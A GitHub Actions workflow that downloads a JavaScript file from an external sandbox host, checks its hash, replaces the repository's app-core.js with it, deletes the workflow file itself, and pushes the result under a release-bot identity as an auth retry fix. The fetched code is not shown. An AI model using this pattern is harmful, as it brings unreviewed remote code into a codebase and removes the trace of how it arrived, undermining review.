name: Import auth retry fix

on:
  push:
    branches:
      - feat/academy-rekaz-parity-20261028

permissions:
  contents: write

concurrency:
  group: import-auth-retry-fix
  cancel-in-progress: false

jobs:
  import:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout target branch
        uses: actions/checkout@v4
        with:
          ref: feat/academy-rekaz-parity-20261028
          fetch-depth: 0
          persist-credentials: true

      - name: Download and validate retry fix
        run: |
          curl --fail --location --retry 3 --retry-delay 2 \
            https://sb-1k0rp8eic9ee.vercel.run/app-core.js \
            --output /tmp/app-core.js
          echo "d90e214532e14afaa88228789d29ded0a7e456265168ee60f0379c460bcb5fc9  /tmp/app-core.js" | sha256sum --check -
          test "$(stat -c %s /tmp/app-core.js)" -eq 25658

      - name: Apply and validate
        run: |
          cp /tmp/app-core.js app-core.js
          rm -f .github/workflows/import-auth-retry-fix.yml
          node --check app-core.js
          git diff --check

      - name: Commit retry fix
        run: |
          git config user.name "playin365-release-bot"
          git config user.email "actions@users.noreply.github.com"
          git add -A
          git commit -m "fix(auth): retry transient Supabase JWT clock skew"
          git push origin HEAD:feat/academy-rekaz-parity-20261028
